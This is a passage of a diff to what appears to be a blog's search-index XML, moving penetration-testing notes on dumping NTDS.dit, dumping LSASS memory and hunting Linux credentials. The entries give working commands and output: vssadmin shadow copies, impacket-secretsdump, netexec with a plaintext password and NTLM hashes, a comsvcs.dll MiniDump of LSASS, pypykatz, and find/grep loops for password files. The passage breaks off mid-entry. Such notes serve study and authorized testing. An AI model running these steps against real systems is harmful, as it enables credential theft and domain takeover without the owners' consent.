@@ -91,32 +91,21 @@
       </tags>
   </entry>
   <entry>
-    <title>Dump NTDS</title>
-    <url>/2025/11/26/Dump-NTDS/</url>
-    <content><![CDATA[<p>➜ Required privilege </p>
-<ul>
-<li><p><code>Member of Domain Admins (DA)</code></p>
-</li>
-<li><p><code>Member of Enterprise Admins (EA)</code></p>
-</li>
-<li><p><code>Member of local Administrators group on the DC</code></p>
-</li>
-<li><p><code>Backup Operators ( SeBackupPrivilege )</code></p>
-</li>
-</ul>
-<h1 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h1><h3 id="Creating-shadow-copy-of-C"><a href="#Creating-shadow-copy-of-C" class="headerlink" title="Creating shadow copy of C:"></a>Creating shadow copy of C:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; vssadmin CREATE SHADOW /For=C:</span><br><span class="line"></span><br><span class="line">Successfully created shadow copy <span class="keyword">for</span> <span class="string">&#x27;C:\&#x27;</span></span><br><span class="line">    Shadow Copy ID: &#123;186d5979-2f2b-4afe-8101-9f1111e4cb1a&#125;</span><br><span class="line">    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br></pre></td></tr></table></figure>
+    <title>Dump Lsass</title>
+    <url>/2025/11/26/Dump-Lsass/</url>
+    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
+<p><img src="/img/task-manager.png" alt="Select the process"></p>
+<p>Create a dump file</p>
+<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
+<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
+<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
 
-<h3 id="Copying-NTDS-dit-from-the-VSS"><a href="#Copying-NTDS-dit-from-the-VSS" class="headerlink" title="Copying NTDS.dit from the VSS"></a>Copying NTDS.dit from the VSS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\NTDS&gt; cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure>
+<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
 
 
-<h3 id="Dump-hashes"><a href="#Dump-hashes" class="headerlink" title="Dump hashes"></a>Dump hashes</h3><p>➜ Since the hashes stored in <code>NTDS.dit</code> are encrypted with a key stored in <code>SYSTEM</code>, we need to transfer the <code>SYSTEM</code> registry with <code>NTDS.dit</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h1><h3 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</span><br><span class="line"></span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
+<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
@@ -124,45 +113,7 @@
         <category>Dump-Passwords</category>
       </categories>
       <tags>
-        <tag>Dump-NTDS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux Credential Hunting</title>
-    <url>/2025/11/27/Linux-Credential-Hunting/</url>
-    <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
-
-<h3 id="Searching-for-configuration-files"><a href="#Searching-for-configuration-files" class="headerlink" title="Searching for configuration files"></a>Searching for configuration files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.conf .config .cnf&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;lib\|fonts\|share\|core&quot;</span> ;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Searching-for-Passwords-in-Configuration-Files"><a href="#Searching-for-Passwords-in-Configuration-Files" class="headerlink" title="Searching for Passwords in Configuration Files"></a>Searching for Passwords in Configuration Files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(find / -<span class="built_in">type</span> f \( -iname <span class="string">&quot;*.txt&quot;</span> -o -iname <span class="string">&quot;*.ini&quot;</span> -o -iname <span class="string">&quot;*.cfg&quot;</span> -o -iname <span class="string">&quot;*.config&quot;</span> -o -iname <span class="string">&quot;*.xml&quot;</span> -o -iname <span class="string">&quot;*.yml&quot;</span> -o -iname <span class="string">&quot;*.yaml&quot;</span> -o -iname <span class="string">&quot;*.cnf&quot;</span> -o -iname <span class="string">&quot;*.conf&quot;</span> -o -iname <span class="string">&quot;*.sh&quot;</span> -o -iname <span class="string">&quot;*.py&quot;</span> -o -iname <span class="string">&quot;*.php&quot;</span> -o -iname <span class="string">&quot;*.git&quot;</span> -o -iname <span class="string">&quot;*.json&quot;</span> \) 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib&quot;</span>); <span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile: <span class="variable">$i</span>&quot;</span>; grep -Ei <span class="string">&quot;password|passphrase|key|username|user account|creds|users|passkeys|configuration|dbcredential|dbpassword|pwd|login|credentials&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> 2&gt;/dev/null | grep -Ev <span class="string">&quot;^\s*#&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Searching-for-databases"><a href="#Searching-for-databases" class="headerlink" title="Searching for databases"></a>Searching for databases</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.sql .db .*db .db*&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nDB File extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share\|man&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Searching-for-scripts"><a href="#Searching-for-scripts" class="headerlink" title="Searching for scripts"></a>Searching for scripts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.py .pyc .pl .go .jar .c .sh&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Searching-for-notes"><a href="#Searching-for-notes" class="headerlink" title="Searching for notes"></a>Searching for notes</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /home/* -<span class="built_in">type</span> f -name <span class="string">&quot;*.txt&quot;</span> -o ! -name <span class="string">&quot;*.*&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Enumerating-log-files"><a href="#Enumerating-log-files" class="headerlink" title="Enumerating log files"></a>Enumerating log files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">ls</span> /var/log/* 2&gt;/dev/null);<span class="keyword">do</span> GREP=$(grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null); <span class="keyword">if</span> [[ <span class="variable">$GREP</span> ]];<span class="keyword">then</span> <span class="built_in">echo</span> -e <span class="string">&quot;\n#### Log file: &quot;</span> <span class="variable">$i</span>; grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null;<span class="keyword">fi</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Enumerating-cronjobs"><a href="#Enumerating-cronjobs" class="headerlink" title="Enumerating cronjobs"></a>Enumerating cronjobs</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab </span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /etc/cron.*/</span><br><span class="line"></span><br><span class="line">/etc/cron.d/:</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 root root  106  3. Jan 20:27 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all</span><br><span class="line">-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate</span><br><span class="line">-rw-r--r-- 1 root root  607 25. Jan 2021  john</span><br><span class="line">-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm</span><br><span class="line">-rw-r--r-- 1 root root  712 11. Mai 2020  php</span><br><span class="line">-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder</span><br><span class="line">-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/:</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x 1 root root  252  6. Jan 16:24 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>config-files</tag>
-        <tag>history-file</tag>
-        <tag>db-files</tag>
-        <tag>cronjobs-enumeration</tag>
+        <tag>Dump-Lsass</tag>
       </tags>
   </entry>
   <entry>
@@ -205,6 +156,81 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux Credential Hunting</title>
+    <url>/2025/11/27/Linux-Credential-Hunting/</url>
+    <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
+
+<h3 id="Searching-for-configuration-files"><a href="#Searching-for-configuration-files" class="headerlink" title="Searching for configuration files"></a>Searching for configuration files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.conf .config .cnf&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;lib\|fonts\|share\|core&quot;</span> ;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Searching-for-Passwords-in-Configuration-Files"><a href="#Searching-for-Passwords-in-Configuration-Files" class="headerlink" title="Searching for Passwords in Configuration Files"></a>Searching for Passwords in Configuration Files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(find / -<span class="built_in">type</span> f \( -iname <span class="string">&quot;*.txt&quot;</span> -o -iname <span class="string">&quot;*.ini&quot;</span> -o -iname <span class="string">&quot;*.cfg&quot;</span> -o -iname <span class="string">&quot;*.config&quot;</span> -o -iname <span class="string">&quot;*.xml&quot;</span> -o -iname <span class="string">&quot;*.yml&quot;</span> -o -iname <span class="string">&quot;*.yaml&quot;</span> -o -iname <span class="string">&quot;*.cnf&quot;</span> -o -iname <span class="string">&quot;*.conf&quot;</span> -o -iname <span class="string">&quot;*.sh&quot;</span> -o -iname <span class="string">&quot;*.py&quot;</span> -o -iname <span class="string">&quot;*.php&quot;</span> -o -iname <span class="string">&quot;*.git&quot;</span> -o -iname <span class="string">&quot;*.json&quot;</span> \) 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib&quot;</span>); <span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile: <span class="variable">$i</span>&quot;</span>; grep -Ei <span class="string">&quot;password|passphrase|key|username|user account|creds|users|passkeys|configuration|dbcredential|dbpassword|pwd|login|credentials&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> 2&gt;/dev/null | grep -Ev <span class="string">&quot;^\s*#&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Searching-for-databases"><a href="#Searching-for-databases" class="headerlink" title="Searching for databases"></a>Searching for databases</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.sql .db .*db .db*&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nDB File extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share\|man&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Searching-for-scripts"><a href="#Searching-for-scripts" class="headerlink" title="Searching for scripts"></a>Searching for scripts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.py .pyc .pl .go .jar .c .sh&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Searching-for-notes"><a href="#Searching-for-notes" class="headerlink" title="Searching for notes"></a>Searching for notes</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /home/* -<span class="built_in">type</span> f -name <span class="string">&quot;*.txt&quot;</span> -o ! -name <span class="string">&quot;*.*&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Enumerating-log-files"><a href="#Enumerating-log-files" class="headerlink" title="Enumerating log files"></a>Enumerating log files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">ls</span> /var/log/* 2&gt;/dev/null);<span class="keyword">do</span> GREP=$(grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null); <span class="keyword">if</span> [[ <span class="variable">$GREP</span> ]];<span class="keyword">then</span> <span class="built_in">echo</span> -e <span class="string">&quot;\n#### Log file: &quot;</span> <span class="variable">$i</span>; grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null;<span class="keyword">fi</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Enumerating-cronjobs"><a href="#Enumerating-cronjobs" class="headerlink" title="Enumerating cronjobs"></a>Enumerating cronjobs</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab </span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /etc/cron.*/</span><br><span class="line"></span><br><span class="line">/etc/cron.d/:</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 root root  106  3. Jan 20:27 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all</span><br><span class="line">-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate</span><br><span class="line">-rw-r--r-- 1 root root  607 25. Jan 2021  john</span><br><span class="line">-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm</span><br><span class="line">-rw-r--r-- 1 root root  712 11. Mai 2020  php</span><br><span class="line">-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder</span><br><span class="line">-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/:</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x 1 root root  252  6. Jan 16:24 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>config-files</tag>
+        <tag>history-file</tag>
+        <tag>db-files</tag>
+        <tag>cronjobs-enumeration</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Dump NTDS</title>
+    <url>/2025/11/26/Dump-NTDS/</url>
+    <content><![CDATA[<p>➜ Required privilege </p>
+<ul>
+<li><p><code>Member of Domain Admins (DA)</code></p>
+</li>
+<li><p><code>Member of Enterprise Admins (EA)</code></p>
+</li>
+<li><p><code>Member of local Administrators group on the DC</code></p>
+</li>
+<li><p><code>Backup Operators ( SeBackupPrivilege )</code></p>
+</li>
+</ul>
+<h1 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h1><h3 id="Creating-shadow-copy-of-C"><a href="#Creating-shadow-copy-of-C" class="headerlink" title="Creating shadow copy of C:"></a>Creating shadow copy of C:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; vssadmin CREATE SHADOW /For=C:</span><br><span class="line"></span><br><span class="line">Successfully created shadow copy <span class="keyword">for</span> <span class="string">&#x27;C:\&#x27;</span></span><br><span class="line">    Shadow Copy ID: &#123;186d5979-2f2b-4afe-8101-9f1111e4cb1a&#125;</span><br><span class="line">    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br></pre></td></tr></table></figure>
+
+<h3 id="Copying-NTDS-dit-from-the-VSS"><a href="#Copying-NTDS-dit-from-the-VSS" class="headerlink" title="Copying NTDS.dit from the VSS"></a>Copying NTDS.dit from the VSS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\NTDS&gt; cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Dump-hashes"><a href="#Dump-hashes" class="headerlink" title="Dump hashes"></a>Dump hashes</h3><p>➜ Since the hashes stored in <code>NTDS.dit</code> are encrypted with a key stored in <code>SYSTEM</code>, we need to transfer the <code>SYSTEM</code> registry with <code>NTDS.dit</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h1><h3 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</span><br><span class="line"></span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-NTDS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux-Memory-Cache-Browser-Credentials-Hunting</title>
     <url>/2025/11/27/Linux-Memory-Cache-Browser-Credentials-Hunting/</url>
     <content><![CDATA[<h2 id="Mimipenguin-root-access-is-required"><a href="#Mimipenguin-root-access-is-required" class="headerlink" title="Mimipenguin ( root access is required )"></a>Mimipenguin ( root access is required )</h2><p>➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.</p>
@@ -238,32 +264,6 @@
         <tag>browser-credentials</tag>
         <tag>LaZagne</tag>
         <tag>Mimipenguin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Dump Lsass</title>
-    <url>/2025/11/26/Dump-Lsass/</url>
-    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
-<p><img src="/img/task-manager.png" alt="Select the process"></p>
-<p>Create a dump file</p>
-<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
-<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
-<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
-
-<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-Lsass</tag>
       </tags>
   </entry>
   <entry>
@@ -318,37 +318,6 @@
       <tags>
         <tag>Enumeration</tag>
         <tag>MSSQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux Pass the Hash (PtH)</title>
-    <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
